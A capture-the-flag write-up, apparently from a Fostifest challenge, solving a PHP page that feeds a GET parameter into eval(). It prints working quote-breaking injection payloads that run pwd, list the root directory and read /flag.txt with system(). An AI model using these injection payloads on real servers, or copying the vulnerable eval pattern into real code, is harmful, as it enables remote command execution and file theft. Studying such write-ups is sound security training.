
## Si paling eval

**Description:** - <br>
**Target:** http://103.187.146.174:8080/

## Steps
The site showed the index.php source code
```
<?php  
if (isset($_GET['nama'])) {  
$cmd = $_GET['nama'];  
  
print eval("print 'Hello $cmd';");  
} else {  
highlight_file(__FILE__);  
}  
?>
```
From the source code and title, we know that the objective of this challenge is to leverage `eval()` in PHP to gain code execution. We will use `nama` parameter at the end of the URL.
Putting in `http://103.187.146.174:8080/?nama= ';print exec('pwd'); echo' ` and submitting we get `Hello /var/www/html` , which confirming that command execution is successful. 

Searching through the usual directories, we are unable to find the flag. Therefore, we need to list directories.
```
http://103.187.146.174:8080/?nama= '; print_r(glob('/*')); echo'
```
which yields,
```
Hello Array ( [0] => /bin [1] => /boot [2] => /dev [3] => /etc [4] => /flag.txt [5] => /home [6] => /lib [7] => /lib64 [8] => /media [9] => /mnt [10] => /opt [11] => /proc [12] => /root [13] => /run [14] => /sbin [15] => /srv [16] => /sys [17] => /tmp [18] => /usr [19] => /var )
```
Hence, we found a file called `flag.txt` in the root directory which we can print with the last payload.
```
http://103.187.146.174:8080/?nama='; system('cat /flag.txt'); echo'
```

```
Flag: Fostifest{REDACTED}
```
## References:
https://ctftime.org/writeup/16595
https://hackin7.github.io/Generated/CTF_Writeups/2021/Sieberrsec%20CTF%202.0/Training/Calculator%20Evaluation/index.html
